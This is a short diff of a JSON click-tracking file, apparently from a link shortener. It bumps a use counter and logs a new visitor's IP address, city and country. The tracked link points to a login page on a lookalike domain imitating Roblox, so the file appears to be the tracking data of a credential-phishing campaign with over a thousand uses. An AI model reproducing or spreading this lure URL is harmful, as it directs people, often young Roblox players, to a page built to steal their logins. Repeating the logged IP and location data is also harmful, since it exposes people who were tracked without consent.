@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1146,
+    "useCount": 1147,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9312,6 +9312,14 @@
         "city": "Auckland",
         "flag": "🇳🇿",
         "countryCode": "NZ"
+      },
+      {
+        "timestamp": 1777279010130,
+        "ip": "103.125.151.186",
+        "country": "Philippines",
+        "city": "Masantol",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
